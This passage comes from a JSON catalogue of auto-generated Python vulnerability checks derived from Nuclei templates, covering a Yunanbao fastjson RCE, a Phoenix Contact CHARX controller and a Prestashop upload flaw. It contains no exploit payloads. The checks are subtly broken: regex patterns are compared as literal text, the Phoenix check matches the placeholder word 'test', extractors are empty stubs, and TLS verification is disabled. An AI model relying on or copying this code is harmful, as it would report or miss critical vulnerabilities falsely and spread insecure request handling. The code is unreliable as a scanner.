            "description": "Hostname ou IP de la cible"
          },
          {
            "name": "root_url",
            "datatype": "string",
            "required": false,
            "description": "URL racine sans chemin"
          }
        ],
        "returns": {
          "datatype": "Finding",
          "description": "Résultat de la détection : matched (bool), extracted_values (list), severity, template_id"
        },
        "source": "#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n\"\"\"\nNuclei Template: yunanbao-rce\nName: Yunanbao Cloud Box FastJson - Deserialization Remote Code Execution\nSeverity: critical\nDescription: The authService interface of Cloud Box uses the vulnerable fastjson component. Unauthorized attackers can launch attacks on Cloud Box through the fastjson serialization vulnerability to obtain server permissions.\nAuto-generated by NucleiForge\n\"\"\"\n\nimport sys\nimport re\nimport json\nimport urllib.parse\nimport urllib.request\nfrom typing import List, Dict, Any, Optional\n\nclass NucleiCheck_yunanbao_rce:\n    \"\"\"Detection check generated from Nuclei template.\"\"\"\n\n    TEMPLATE_ID = \"yunanbao-rce\"\n    SEVERITY = \"critical\"\n    NAME = \"Yunanbao Cloud Box FastJson - Deserialization Remote Code Execution\"\n\n    def __init__(self, target: str, **kwargs):\n        self.target = target.rstrip('/')\n        self.protocol = \"http\"\n        self.timeout = kwargs.get('timeout', 10)\n        self.proxy = kwargs.get('proxy', None)\n        self.follow_redirects = kwargs.get('follow_redirects', True)\n\n    def run(self) -> Dict[str, Any]:\n        \"\"\"Execute the detection check.\"\"\"\n        result = {\n            \"template_id\": self.TEMPLATE_ID,\n            \"name\": self.NAME,\n            \"severity\": self.SEVERITY,\n            \"target\": self.target,\n            \"matched\": False,\n            \"extracted\": [],\n            \"error\": None\n        }\n\n        try:\n            url = self._build_url()\n            response = self._send_request(url)\n\n            if self._check_matchers(response):\n                result[\"matched\"] = True\n                result[\"extracted\"] = self._run_extractors(response)\n                self._on_match(result)\n            else:\n                self._on_no_match(result)\n\n        except Exception as e:\n            result[\"error\"] = str(e)\n            self._on_error(e)\n\n        return result\n\n    def _build_url(self) -> str:\n        \"\"\"Construct target URL.\"\"\"\n        path = \"/\"\n        # Replace Nuclei variables\n        path = path.replace(\"{BaseURL}\", self.target)\n        path = path.replace(\"{BasePath}\", \"/\")\n        path = path.replace(\"{RootURL}\", self.target)\n        path = path.replace(\"{Hostname}\", urllib.parse.urlparse(self.target).hostname or self.target)\n        path = path.replace(\"{Port}\", str(urllib.parse.urlparse(self.target).port or\n                                          (443 if self.protocol == \"https\" else 80)))\n        path = path.replace(\"{Path}\", \"/\")\n        path = path.replace(\"{Scheme}\", self.protocol)\n\n        # Random strings (simplified)\n        import random, string\n        path = re.sub(r'{randstr}', lambda m: ''.join(random.choices(string.ascii_lowercase, k=8)), path)\n        path = re.sub(r'{rand_int}', lambda m: str(random.randint(1000, 9999)), path)\n\n        return urllib.parse.urljoin(self.target, path)\n\n    def _send_request(self, url: str) -> Dict[str, Any]:\n        \"\"\"Send HTTP request and return response dict.\"\"\"\n        import urllib.request\n        import ssl\n\n        req = urllib.request.Request(url, method=\"GET\")\n\n        # Headers\n        headers = {}\n        for k, v in headers.items():\n            req.add_header(k, v)\n\n        # SSL context\n        ctx = ssl.create_default_context()\n        ctx.check_hostname = False\n        ctx.verify_mode = ssl.CERT_NONE\n\n        # Proxy\n        if self.proxy:\n            req.set_proxy(self.proxy, 'http')\n\n        # Body\n        body = None\n        if body:\n            req.data = body.encode('utf-8')\n            if 'Content-Type' not in headers:\n                req.add_header('Content-Type', 'application/x-www-form-urlencoded')\n\n        response = urllib.request.urlopen(req, timeout=self.timeout, context=ctx)\n\n        return {\n            \"status_code\": response.getcode(),\n            \"headers\": dict(response.headers),\n            \"body\": response.read().decode('utf-8', errors='replace'),\n            \"url\": response.geturl()\n        }\n\n    def _check_matchers(self, response: Dict) -> bool:\n        \"\"\"Check response against matchers.\"\"\"\n        body = response.get(\"body\", \"\")\n        headers = str(response.get(\"headers\", {}))\n        status = response.get(\"status_code\", 0)\n\n        # TODO: Implement specific matchers from template\n        # Current: basic string matching from detection summary\n        detection = \"[AND] regex ['uid=([a-z=0-9() ]+) gid=([a-z=0-9() ]+) groups=([a-z=0-9() ]+)'] | status HTTP [200]\"\n\n        # Simple word matcher simulation\n        matchers = ['uid=([a-z=0-9() ]+) gid=([a-z=0-9() ]+) groups=([a-z=0-9() ]+)']\n\n        for matcher in matchers:\n            if matcher.lower() in body.lower():\n                return True\n            if matcher.lower() in headers.lower():\n                return True\n\n        return False\n\n    def _run_extractors(self, response: Dict) -> List[str]:\n        \"\"\"Run extractors on response.\"\"\"\n        extracted = []\n        body = response.get(\"body\", \"\")\n\n        # Regex extractors (simplified)\n        # TODO: Parse actual regex patterns from template\n\n        return extracted\n\n    def _on_match(self, result: Dict):\n        \"\"\"Handle match event.\"\"\"\n        print(f\"[MATCH] {result['name']} on {result['target']}\")\n        print(f\"        Severity: {result['severity']}\")\n\n    def _on_no_match(self, result: Dict):\n        \"\"\"Handle no-match event.\"\"\"\n        print(f\"[NO MATCH] {result['name']} on {result['target']}\")\n\n    def _on_error(self, error: Exception):\n        \"\"\"Handle error event.\"\"\"\n        print(f\"[ERROR] {error}\", file=sys.stderr)\n\n\ndef main():\n    \"\"\"CLI entry point.\"\"\"\n    import argparse\n    parser = argparse.ArgumentParser(description=\"Yunanbao Cloud Box FastJson - Deserialization Remote Code Execution\")\n    parser.add_argument(\"target\", help=\"Target URL/hostname\")\n    parser.add_argument(\"--proxy\", help=\"Proxy URL\")\n    parser.add_argument(\"--timeout\", type=int, default=10)\n    args = parser.parse_args()\n\n    checker = NucleiCheck_yunanbao_rce(\n        target=args.target,\n        proxy=args.proxy,\n        timeout=args.timeout\n    )\n    result = checker.run()\n\n    print(json.dumps(result, indent=2, ensure_ascii=False))\n    sys.exit(0 if result[\"matched\"] else 1)\n\n\nif __name__ == \"__main__\":\n    main()",
        "source_original": "#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n\"\"\"\nNuclei Template: yunanbao-rce\nName: Yunanbao Cloud Box FastJson - Deserialization Remote Code Execution\nSeverity: critical\nDescription: The authService interface of Cloud Box uses the vulnerable fastjson component. Unauthorized attackers can launch attacks on Cloud Box through the fastjson serialization vulnerability to obtain server permissions.\nAuto-generated by NucleiForge\n\"\"\"\n\nimport sys\nimport re\nimport json\nimport urllib.parse\nimport urllib.request\nfrom typing import List, Dict, Any, Optional\n\nclass NucleiCheck_yunanbao_rce:\n    \"\"\"Detection check generated from Nuclei template.\"\"\"\n\n    TEMPLATE_ID = \"yunanbao-rce\"\n    SEVERITY = \"critical\"\n    NAME = \"Yunanbao Cloud Box FastJson - Deserialization Remote Code Execution\"\n\n    def __init__(self, target: str, **kwargs):\n        self.target = target.rstrip('/')\n        self.protocol = \"http\"\n        self.timeout = kwargs.get('timeout', 10)\n        self.proxy = kwargs.get('proxy', None)\n        self.follow_redirects = kwargs.get('follow_redirects', True)\n\n    def run(self) -> Dict[str, Any]:\n        \"\"\"Execute the detection check.\"\"\"\n        result = {\n            \"template_id\": self.TEMPLATE_ID,\n            \"name\": self.NAME,\n            \"severity\": self.SEVERITY,\n            \"target\": self.target,\n            \"matched\": False,\n            \"extracted\": [],\n            \"error\": None\n        }\n\n        try:\n            url = self._build_url()\n            response = self._send_request(url)\n\n            if self._check_matchers(response):\n                result[\"matched\"] = True\n                result[\"extracted\"] = self._run_extractors(response)\n                self._on_match(result)\n            else:\n                self._on_no_match(result)\n\n        except Exception as e:\n            result[\"error\"] = str(e)\n            self._on_error(e)\n\n        return result\n\n    def _build_url(self) -> str:\n        \"\"\"Construct target URL.\"\"\"\n        path = \"/\"\n        # Replace Nuclei variables\n        path = path.replace(\"{BaseURL}\", self.target)\n        path = path.replace(\"{BasePath}\", \"/\")\n        path = path.replace(\"{RootURL}\", self.target)\n        path = path.replace(\"{Hostname}\", urllib.parse.urlparse(self.target).hostname or self.target)\n        path = path.replace(\"{Port}\", str(urllib.parse.urlparse(self.target).port or\n                                          (443 if self.protocol == \"https\" else 80)))\n        path = path.replace(\"{Path}\", \"/\")\n        path = path.replace(\"{Scheme}\", self.protocol)\n\n        # Random strings (simplified)\n        import random, string\n        path = re.sub(r'{randstr}', lambda m: ''.join(random.choices(string.ascii_lowercase, k=8)), path)\n        path = re.sub(r'{rand_int}', lambda m: str(random.randint(1000, 9999)), path)\n\n        return urllib.parse.urljoin(self.target, path)\n\n    def _send_request(self, url: str) -> Dict[str, Any]:\n        \"\"\"Send HTTP request and return response dict.\"\"\"\n        import urllib.request\n        import ssl\n\n        req = urllib.request.Request(url, method=\"GET\")\n\n        # Headers\n        headers = {}\n        for k, v in headers.items():\n            req.add_header(k, v)\n\n        # SSL context\n        ctx = ssl.create_default_context()\n        ctx.check_hostname = False\n        ctx.verify_mode = ssl.CERT_NONE\n\n        # Proxy\n        if self.proxy:\n            req.set_proxy(self.proxy, 'http')\n\n        # Body\n        body = None\n        if body:\n            req.data = body.encode('utf-8')\n            if 'Content-Type' not in headers:\n                req.add_header('Content-Type', 'application/x-www-form-urlencoded')\n\n        response = urllib.request.urlopen(req, timeout=self.timeout, context=ctx)\n\n        return {\n            \"status_code\": response.getcode(),\n            \"headers\": dict(response.headers),\n            \"body\": response.read().decode('utf-8', errors='replace'),\n            \"url\": response.geturl()\n        }\n\n    def _check_matchers(self, response: Dict) -> bool:\n        \"\"\"Check response against matchers.\"\"\"\n        body = response.get(\"body\", \"\")\n        headers = str(response.get(\"headers\", {}))\n        status = response.get(\"status_code\", 0)\n\n        # TODO: Implement specific matchers from template\n        # Current: basic string matching from detection summary\n        detection = \"[AND] regex ['uid=([a-z=0-9() ]+) gid=([a-z=0-9() ]+) groups=([a-z=0-9() ]+)'] | status HTTP [200]\"\n\n        # Simple word matcher simulation\n        matchers = ['uid=([a-z=0-9() ]+) gid=([a-z=0-9() ]+) groups=([a-z=0-9() ]+)']\n\n        for matcher in matchers:\n            if matcher.lower() in body.lower():\n                return True\n            if matcher.lower() in headers.lower():\n                return True\n\n        return False\n\n    def _run_extractors(self, response: Dict) -> List[str]:\n        \"\"\"Run extractors on response.\"\"\"\n        extracted = []\n        body = response.get(\"body\", \"\")\n\n        # Regex extractors (simplified)\n        # TODO: Parse actual regex patterns from template\n\n        return extracted\n\n    def _on_match(self, result: Dict):\n        \"\"\"Handle match event.\"\"\"\n        print(f\"[MATCH] {result['name']} on {result['target']}\")\n        print(f\"        Severity: {result['severity']}\")\n\n    def _on_no_match(self, result: Dict):\n        \"\"\"Handle no-match event.\"\"\"\n        print(f\"[NO MATCH] {result['name']} on {result['target']}\")\n\n    def _on_error(self, error: Exception):\n        \"\"\"Handle error event.\"\"\"\n        print(f\"[ERROR] {error}\", file=sys.stderr)\n\n\ndef main():\n    \"\"\"CLI entry point.\"\"\"\n    import argparse\n    parser = argparse.ArgumentParser(description=\"Yunanbao Cloud Box FastJson - Deserialization Remote Code Execution\")\n    parser.add_argument(\"target\", help=\"Target URL/hostname\")\n    parser.add_argument(\"--proxy\", help=\"Proxy URL\")\n    parser.add_argument(\"--timeout\", type=int, default=10)\n    args = parser.parse_args()\n\n    checker = NucleiCheck_yunanbao_rce(\n        target=args.target,\n        proxy=args.proxy,\n        timeout=args.timeout\n    )\n    result = checker.run()\n\n    print(json.dumps(result, indent=2, ensure_ascii=False))\n    sys.exit(0 if result[\"matched\"] else 1)\n\n\nif __name__ == \"__main__\":\n    main()",
        "cve": [],
        "tags": [
          "yunanbao",
          "rce",
          "cloud-box",
          "vuln"
        ],
        "cvss_score": 10.0
      },
      {
        "id": "fn_nuclei_phoenix_contact_charx_multiple_vulnerabilities",
        "name": "Phoenix Contact CHARX SEC-3XXX AC Controller < 1.7.3 - Multiple Vulnerabilities",
        "language": "Python",
        "famille": "WebApp",
        "description": "Multiple vulnerabilities exist in Phoenix Contact CHARX SEC-3XXX AC Controller versions prior to 1.7.3. Successful exploitation may allow attackers to bypass authentication, disclose sensitive information, or execute arbitrary code.",
        "severity": "critical",
        "detection": "[OR] DSL: status_code == 200; contains_all(body, \"charging_controllers\", \"system\")",
        "parameters": [
          {
            "name": "base_url",
            "datatype": "string",
            "required": true,
            "description": "URL de base de la cible"
          }
        ],
        "returns": {
          "datatype": "Finding",
          "description": "Résultat de la détection : matched (bool), extracted_values (list), severity, template_id"
        },
        "source": "#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n\"\"\"\nNuclei Template: phoenix-contact-charx-multiple-vulnerabilities\nName: Phoenix Contact CHARX SEC-3XXX AC Controller < 1.7.3 - Multiple Vulnerabilities\nSeverity: critical\nDescription: Multiple vulnerabilities exist in Phoenix Contact CHARX SEC-3XXX AC Controller versions prior to 1.7.3. Successful exploitation may allow attackers to bypass authentication, disclose sensitive information, or execute arbitrary code.\nAuto-generated by NucleiForge\n\"\"\"\n\nimport sys\nimport re\nimport json\nimport urllib.parse\nimport urllib.request\nfrom typing import List, Dict, Any, Optional\n\nclass NucleiCheck_phoenix_contact_charx_multiple_vulnerabilities:\n    \"\"\"Detection check generated from Nuclei template.\"\"\"\n\n    TEMPLATE_ID = \"phoenix-contact-charx-multiple-vulnerabilities\"\n    SEVERITY = \"critical\"\n    NAME = \"Phoenix Contact CHARX SEC-3XXX AC Controller < 1.7.3 - Multiple Vulnerabilities\"\n\n    def __init__(self, target: str, **kwargs):\n        self.target = target.rstrip('/')\n        self.protocol = \"http\"\n        self.timeout = kwargs.get('timeout', 10)\n        self.proxy = kwargs.get('proxy', None)\n        self.follow_redirects = kwargs.get('follow_redirects', True)\n\n    def run(self) -> Dict[str, Any]:\n        \"\"\"Execute the detection check.\"\"\"\n        result = {\n            \"template_id\": self.TEMPLATE_ID,\n            \"name\": self.NAME,\n            \"severity\": self.SEVERITY,\n            \"target\": self.target,\n            \"matched\": False,\n            \"extracted\": [],\n            \"error\": None\n        }\n\n        try:\n            url = self._build_url()\n            response = self._send_request(url)\n\n            if self._check_matchers(response):\n                result[\"matched\"] = True\n                result[\"extracted\"] = self._run_extractors(response)\n                self._on_match(result)\n            else:\n                self._on_no_match(result)\n\n        except Exception as e:\n            result[\"error\"] = str(e)\n            self._on_error(e)\n\n        return result\n\n    def _build_url(self) -> str:\n        \"\"\"Construct target URL.\"\"\"\n        path = \"/\"\n        # Replace Nuclei variables\n        path = path.replace(\"{BaseURL}\", self.target)\n        path = path.replace(\"{BasePath}\", \"/\")\n        path = path.replace(\"{RootURL}\", self.target)\n        path = path.replace(\"{Hostname}\", urllib.parse.urlparse(self.target).hostname or self.target)\n        path = path.replace(\"{Port}\", str(urllib.parse.urlparse(self.target).port or\n                                          (443 if self.protocol == \"https\" else 80)))\n        path = path.replace(\"{Path}\", \"/\")\n        path = path.replace(\"{Scheme}\", self.protocol)\n\n        # Random strings (simplified)\n        import random, string\n        path = re.sub(r'{randstr}', lambda m: ''.join(random.choices(string.ascii_lowercase, k=8)), path)\n        path = re.sub(r'{rand_int}', lambda m: str(random.randint(1000, 9999)), path)\n\n        return urllib.parse.urljoin(self.target, path)\n\n    def _send_request(self, url: str) -> Dict[str, Any]:\n        \"\"\"Send HTTP request and return response dict.\"\"\"\n        import urllib.request\n        import ssl\n\n        req = urllib.request.Request(url, method=\"GET\")\n\n        # Headers\n        headers = {}\n        for k, v in headers.items():\n            req.add_header(k, v)\n\n        # SSL context\n        ctx = ssl.create_default_context()\n        ctx.check_hostname = False\n        ctx.verify_mode = ssl.CERT_NONE\n\n        # Proxy\n        if self.proxy:\n            req.set_proxy(self.proxy, 'http')\n\n        # Body\n        body = None\n        if body:\n            req.data = body.encode('utf-8')\n            if 'Content-Type' not in headers:\n                req.add_header('Content-Type', 'application/x-www-form-urlencoded')\n\n        response = urllib.request.urlopen(req, timeout=self.timeout, context=ctx)\n\n        return {\n            \"status_code\": response.getcode(),\n            \"headers\": dict(response.headers),\n            \"body\": response.read().decode('utf-8', errors='replace'),\n            \"url\": response.geturl()\n        }\n\n    def _check_matchers(self, response: Dict) -> bool:\n        \"\"\"Check response against matchers.\"\"\"\n        body = response.get(\"body\", \"\")\n        headers = str(response.get(\"headers\", {}))\n        status = response.get(\"status_code\", 0)\n\n        # TODO: Implement specific matchers from template\n        # Current: basic string matching from detection summary\n        detection = '[OR] DSL: status_code == 200; contains_all(body, \"charging_controllers\", \"system\")'\n\n        # Simple word matcher simulation\n        matchers = ['test']\n\n        for matcher in matchers:\n            if matcher.lower() in body.lower():\n                return True\n            if matcher.lower() in headers.lower():\n                return True\n\n        return False\n\n    def _run_extractors(self, response: Dict) -> List[str]:\n        \"\"\"Run extractors on response.\"\"\"\n        extracted = []\n        body = response.get(\"body\", \"\")\n\n        # Regex extractors (simplified)\n        # TODO: Parse actual regex patterns from template\n\n        return extracted\n\n    def _on_match(self, result: Dict):\n        \"\"\"Handle match event.\"\"\"\n        print(f\"[MATCH] {result['name']} on {result['target']}\")\n        print(f\"        Severity: {result['severity']}\")\n\n    def _on_no_match(self, result: Dict):\n        \"\"\"Handle no-match event.\"\"\"\n        print(f\"[NO MATCH] {result['name']} on {result['target']}\")\n\n    def _on_error(self, error: Exception):\n        \"\"\"Handle error event.\"\"\"\n        print(f\"[ERROR] {error}\", file=sys.stderr)\n\n\ndef main():\n    \"\"\"CLI entry point.\"\"\"\n    import argparse\n    parser = argparse.ArgumentParser(description=\"Phoenix Contact CHARX SEC-3XXX AC Controller < 1.7.3 - Multiple Vulnerabilities\")\n    parser.add_argument(\"target\", help=\"Target URL/hostname\")\n    parser.add_argument(\"--proxy\", help=\"Proxy URL\")\n    parser.add_argument(\"--timeout\", type=int, default=10)\n    args = parser.parse_args()\n\n    checker = NucleiCheck_phoenix_contact_charx_multiple_vulnerabilities(\n        target=args.target,\n        proxy=args.proxy,\n        timeout=args.timeout\n    )\n    result = checker.run()\n\n    print(json.dumps(result, indent=2, ensure_ascii=False))\n    sys.exit(0 if result[\"matched\"] else 1)\n\n\nif __name__ == \"__main__\":\n    main()",
        "source_original": "#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n\"\"\"\nNuclei Template: phoenix-contact-charx-multiple-vulnerabilities\nName: Phoenix Contact CHARX SEC-3XXX AC Controller < 1.7.3 - Multiple Vulnerabilities\nSeverity: critical\nDescription: Multiple vulnerabilities exist in Phoenix Contact CHARX SEC-3XXX AC Controller versions prior to 1.7.3. Successful exploitation may allow attackers to bypass authentication, disclose sensitive information, or execute arbitrary code.\nAuto-generated by NucleiForge\n\"\"\"\n\nimport sys\nimport re\nimport json\nimport urllib.parse\nimport urllib.request\nfrom typing import List, Dict, Any, Optional\n\nclass NucleiCheck_phoenix_contact_charx_multiple_vulnerabilities:\n    \"\"\"Detection check generated from Nuclei template.\"\"\"\n\n    TEMPLATE_ID = \"phoenix-contact-charx-multiple-vulnerabilities\"\n    SEVERITY = \"critical\"\n    NAME = \"Phoenix Contact CHARX SEC-3XXX AC Controller < 1.7.3 - Multiple Vulnerabilities\"\n\n    def __init__(self, target: str, **kwargs):\n        self.target = target.rstrip('/')\n        self.protocol = \"http\"\n        self.timeout = kwargs.get('timeout', 10)\n        self.proxy = kwargs.get('proxy', None)\n        self.follow_redirects = kwargs.get('follow_redirects', True)\n\n    def run(self) -> Dict[str, Any]:\n        \"\"\"Execute the detection check.\"\"\"\n        result = {\n            \"template_id\": self.TEMPLATE_ID,\n            \"name\": self.NAME,\n            \"severity\": self.SEVERITY,\n            \"target\": self.target,\n            \"matched\": False,\n            \"extracted\": [],\n            \"error\": None\n        }\n\n        try:\n            url = self._build_url()\n            response = self._send_request(url)\n\n            if self._check_matchers(response):\n                result[\"matched\"] = True\n                result[\"extracted\"] = self._run_extractors(response)\n                self._on_match(result)\n            else:\n                self._on_no_match(result)\n\n        except Exception as e:\n            result[\"error\"] = str(e)\n            self._on_error(e)\n\n        return result\n\n    def _build_url(self) -> str:\n        \"\"\"Construct target URL.\"\"\"\n        path = \"/\"\n        # Replace Nuclei variables\n        path = path.replace(\"{BaseURL}\", self.target)\n        path = path.replace(\"{BasePath}\", \"/\")\n        path = path.replace(\"{RootURL}\", self.target)\n        path = path.replace(\"{Hostname}\", urllib.parse.urlparse(self.target).hostname or self.target)\n        path = path.replace(\"{Port}\", str(urllib.parse.urlparse(self.target).port or\n                                          (443 if self.protocol == \"https\" else 80)))\n        path = path.replace(\"{Path}\", \"/\")\n        path = path.replace(\"{Scheme}\", self.protocol)\n\n        # Random strings (simplified)\n        import random, string\n        path = re.sub(r'{randstr}', lambda m: ''.join(random.choices(string.ascii_lowercase, k=8)), path)\n        path = re.sub(r'{rand_int}', lambda m: str(random.randint(1000, 9999)), path)\n\n        return urllib.parse.urljoin(self.target, path)\n\n    def _send_request(self, url: str) -> Dict[str, Any]:\n        \"\"\"Send HTTP request and return response dict.\"\"\"\n        import urllib.request\n        import ssl\n\n        req = urllib.request.Request(url, method=\"GET\")\n\n        # Headers\n        headers = {}\n        for k, v in headers.items():\n            req.add_header(k, v)\n\n        # SSL context\n        ctx = ssl.create_default_context()\n        ctx.check_hostname = False\n        ctx.verify_mode = ssl.CERT_NONE\n\n        # Proxy\n        if self.proxy:\n            req.set_proxy(self.proxy, 'http')\n\n        # Body\n        body = None\n        if body:\n            req.data = body.encode('utf-8')\n            if 'Content-Type' not in headers:\n                req.add_header('Content-Type', 'application/x-www-form-urlencoded')\n\n        response = urllib.request.urlopen(req, timeout=self.timeout, context=ctx)\n\n        return {\n            \"status_code\": response.getcode(),\n            \"headers\": dict(response.headers),\n            \"body\": response.read().decode('utf-8', errors='replace'),\n            \"url\": response.geturl()\n        }\n\n    def _check_matchers(self, response: Dict) -> bool:\n        \"\"\"Check response against matchers.\"\"\"\n        body = response.get(\"body\", \"\")\n        headers = str(response.get(\"headers\", {}))\n        status = response.get(\"status_code\", 0)\n\n        # TODO: Implement specific matchers from template\n        # Current: basic string matching from detection summary\n        detection = '[OR] DSL: status_code == 200; contains_all(body, \"charging_controllers\", \"system\")'\n\n        # Simple word matcher simulation\n        matchers = ['test']\n\n        for matcher in matchers:\n            if matcher.lower() in body.lower():\n                return True\n            if matcher.lower() in headers.lower():\n                return True\n\n        return False\n\n    def _run_extractors(self, response: Dict) -> List[str]:\n        \"\"\"Run extractors on response.\"\"\"\n        extracted = []\n        body = response.get(\"body\", \"\")\n\n        # Regex extractors (simplified)\n        # TODO: Parse actual regex patterns from template\n\n        return extracted\n\n    def _on_match(self, result: Dict):\n        \"\"\"Handle match event.\"\"\"\n        print(f\"[MATCH] {result['name']} on {result['target']}\")\n        print(f\"        Severity: {result['severity']}\")\n\n    def _on_no_match(self, result: Dict):\n        \"\"\"Handle no-match event.\"\"\"\n        print(f\"[NO MATCH] {result['name']} on {result['target']}\")\n\n    def _on_error(self, error: Exception):\n        \"\"\"Handle error event.\"\"\"\n        print(f\"[ERROR] {error}\", file=sys.stderr)\n\n\ndef main():\n    \"\"\"CLI entry point.\"\"\"\n    import argparse\n    parser = argparse.ArgumentParser(description=\"Phoenix Contact CHARX SEC-3XXX AC Controller < 1.7.3 - Multiple Vulnerabilities\")\n    parser.add_argument(\"target\", help=\"Target URL/hostname\")\n    parser.add_argument(\"--proxy\", help=\"Proxy URL\")\n    parser.add_argument(\"--timeout\", type=int, default=10)\n    args = parser.parse_args()\n\n    checker = NucleiCheck_phoenix_contact_charx_multiple_vulnerabilities(\n        target=args.target,\n        proxy=args.proxy,\n        timeout=args.timeout\n    )\n    result = checker.run()\n\n    print(json.dumps(result, indent=2, ensure_ascii=False))\n    sys.exit(0 if result[\"matched\"] else 1)\n\n\nif __name__ == \"__main__\":\n    main()",
        "cve": [],
        "tags": [
          "phoenix-contact",
          "charx",
          "vuln"
        ],
        "cvss_score": 10.0
      },
      {
        "id": "fn_nuclei_prestashop_blocktestimonial_file_upload",
        "name": "Prestashop Blocktestimonial Modules - File Upload Vulnerability",
        "language": "Python",
        "famille": "WebApp",
        "description": "",
        "severity": "critical",
        "detection": "[AND] mot(s) 'Your testimonial was submitted successfully.' | mot(s) '{{data}}'",
        "parameters": [
          {
            "name": "target",
            "datatype": "string",
            "required": true,
            "description": "Hostname ou IP de la cible"
          },
          {
            "name": "filename",
            "datatype": "string",
            "required": false,
            "description": "Variable Nuclei custom: filename",
            "default": "{{rand_base(7, \"abc\")}}"
          },
          {
            "name": "data",
            "datatype": "string",
            "required": false,
            "description": "Variable Nuclei custom: data",
            "default": "{{rand_base(6, \"abc\")}}"
          }
        ],
        "returns": {
          "datatype": "Finding",
          "description": "Résultat de la détection : matched (bool), extracted_values (list), severity, template_id"
        },
        "source": "#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n\"\"\"\nNuclei Template: prestashop-blocktestimonial-file-upload\nName: Prestashop Blocktestimonial Modules - File Upload Vulnerability\nSeverity: critical\nDescription: \nAuto-generated by NucleiForge\n\"\"\"\n\nimport sys\nimport re\nimport json\nimport urllib.parse\nimport urllib.request\nfrom typing import List, Dict, Any, Optional\n\nclass NucleiCheck_prestashop_blocktestimonial_file_upload:\n    \"\"\"Detection check generated from Nuclei template.\"\"\"\n\n    TEMPLATE_ID = \"prestashop-blocktestimonial-file-upload\"\n    SEVERITY = \"critical\"\n    NAME = \"Prestashop Blocktestimonial Modules - File Upload Vulnerability\"\n\n    def __init__(self, target: str, **kwargs):\n        self.target = target.rstrip('/')\n        self.protocol = \"http\"\n        self.timeout = kwargs.get('timeout', 10)\n        self.proxy = kwargs.get('proxy', None)\n        self.follow_redirects = kwargs.get('follow_redirects', True)\n\n    def run(self) -> Dict[str, Any]:\n        \"\"\"Execute the detection check.\"\"\"\n        result = {\n            \"template_id\": self.TEMPLATE_ID,\n            \"name\": self.NAME,\n            \"severity\": self.SEVERITY,\n            \"target\": self.target,\n            \"matched\": False,\n            \"extracted\": [],\n            \"error\": None\n        }\n\n        try:\n            url = self._build_url()\n            response = self._send_request(url)\n\n            if self._check_matchers(response):\n                result[\"matched\"] = True\n                result[\"extracted\"] = self._run_extractors(response)\n                self._on_match(result)\n            else:\n                self._on_no_match(result)\n\n        except Exception as e:\n            result[\"error\"] = str(e)\n            self._on_error(e)\n\n        return result\n\n    def _build_url(self) -> str:\n        \"\"\"Construct target URL.\"\"\"\n        path = \"/\"\n        # Replace Nuclei variables\n        path = path.replace(\"{BaseURL}\", self.target)\n        path = path.replace(\"{BasePath}\", \"/\")\n        path = path.replace(\"{RootURL}\", self.target)\n        path = path.replace(\"{Hostname}\", urllib.parse.urlparse(self.target).hostname or self.target)\n        path = path.replace(\"{Port}\", str(urllib.parse.urlparse(self.target).port or\n                                          (443 if self.protocol == \"https\" else 80)))\n        path = path.replace(\"{Path}\", \"/\")\n        path = path.replace(\"{Scheme}\", self.protocol)\n\n        # Random strings (simplified)\n        import random, string\n        path = re.sub(r'{randstr}', lambda m: ''.join(random.choices(string.ascii_lowercase, k=8)), path)\n        path = re.sub(r'{rand_int}', lambda m: str(random.randint(1000, 9999)), path)\n\n        return urllib.parse.urljoin(self.target, path)\n\n    def _send_request(self, url: str) -> Dict[str, Any]:\n        \"\"\"Send HTTP request and return response dict.\"\"\"\n        import urllib.request\n        import ssl\n\n        req = urllib.request.Request(url, method=\"GET\")\n\n        # Headers\n        headers = {}\n        for k, v in headers.items():\n            req.add_header(k, v)\n\n        # SSL context\n        ctx = ssl.create_default_context()\n        ctx.check_hostname = False\n        ctx.verify_mode = ssl.CERT_NONE\n\n        # Proxy\n        if self.proxy:\n            req.set_proxy(self.proxy, 'http')\n\n        # Body\n        body = None\n        if body:\n            req.data = body.encode('utf-8')\n            if 'Content-Type' not in headers:\n                req.add_header('Content-Type', 'application/x-www-form-urlencoded')\n\n        response = urllib.request.urlopen(req, timeout=self.timeout, context=ctx)\n\n        return {\n            \"status_code\": response.getcode(),\n            \"headers\": dict(response.headers),\n            \"body\": response.read().decode('utf-8', errors='replace'),\n            \"url\": response.geturl()\n        }\n\n    def _check_matchers(self, response: Dict) -> bool:\n        \"\"\"Check response against matchers.\"\"\"\n        body = response.get(\"body\", \"\")\n        headers = str(response.get(\"headers\", {}))\n        status = response.get(\"status_code\", 0)\n\n        # TODO: Implement specific matchers from template\n        # Current: basic string matching from detection summary\n        detection = \"[AND] mot(s) 'Your testimonial was submitted successfully.' | mot(s) '{{data}}'\"\n\n        # Simple word matcher simulation\n        matchers = ['Your testimonial was submitted successfully.', '{{data}}']\n\n        for matcher in matchers:\n            if matcher.lower() in body.lower():\n                return True\n            if matcher.lower() in headers.lower():\n                return True\n\n        return False\n\n    def _run_extractors(self, response: Dict) -> List[str]:\n        \"\"\"Run extractors on response.\"\"\"\n        extracted = []\n        body = response.get(\"body\", \"\")\n\n        # Regex extractors (simplified)\n        # TODO: Parse actual regex patterns from template\n\n        return extracted\n\n    def _on_match(self, result: Dict):\n        \"\"\"Handle match event.\"\"\"\n        print(f\"[MATCH] {result['name']} on {result['target']}\")\n        print(f\"        Severity: {result['severity']}\")\n\n    def _on_no_match(self, result: Dict):\n        \"\"\"Handle no-match event.\"\"\"\n        print(f\"[NO MATCH] {result['name']} on {result['target']}\")\n\n    def _on_error(self, error: Exception):\n        \"\"\"Handle error event.\"\"\"\n        print(f\"[ERROR] {error}\", file=sys.stderr)\n\n\ndef main():\n    \"\"\"CLI entry point.\"\"\"\n    import argparse\n    parser = argparse.ArgumentParser(description=\"Prestashop Blocktestimonial Modules - File Upload Vulnerability\")\n    parser.add_argument(\"target\", help=\"Target URL/hostname\")\n    parser.add_argument(\"--proxy\", help=\"Proxy URL\")\n    parser.add_argument(\"--timeout\", type=int, default=10)\n    args = parser.parse_args()\n\n    checker = NucleiCheck_prestashop_blocktestimonial_file_upload(\n        target=args.target,\n        proxy=args.proxy,\n        timeout=args.timeout\n    )\n    result = checker.run()\n\n    print(json.dumps(result, indent=2, ensure_ascii=False))\n    sys.exit(0 if result[\"matched\"] else 1)\n\n\nif __name__ == \"__main__\":\n    main()",
